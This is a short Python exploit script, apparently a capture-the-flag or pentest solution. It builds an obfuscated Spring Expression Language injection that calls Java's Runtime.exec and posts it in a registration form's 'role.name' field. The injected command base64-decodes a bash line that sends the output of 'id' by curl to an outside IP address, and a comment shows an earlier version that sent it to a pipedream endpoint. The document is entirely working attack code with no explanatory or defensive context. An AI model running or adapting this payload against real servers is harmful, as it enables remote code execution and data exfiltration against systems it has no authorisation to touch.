### PAYLOAD GENERATOR

# Generated using https://ares-x.com/tools/runtime-exec/
# Original payload: curl --data "a=$(id)" https://ebd7cbd9cea913d94aa198a2544ae8d0.m.pipedream.net
import requests

cmd = 'curl --data "a=$(id)" 40.115.138.119:1337'.encode('base64')
payload = 'bash -c "{echo,%s}|{base64,-d}|{bash,-i}"' % (cmd.replace('\n',''))
result = ""
print payload,'\n'
data = dict(username='aaaaaaaJAKSJAKSJ', password='b')

result += 'T(java.lang.Character).toString(%s)' % ord(payload[0])
for ch in payload[1:]:
    result += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
result = '${T(java.lang.Runtime).getRuntime().exec(' + result + ')}'

print result
data['role.name'] = result

requests.post('http://40.115.138.119:10001/register', data=data)
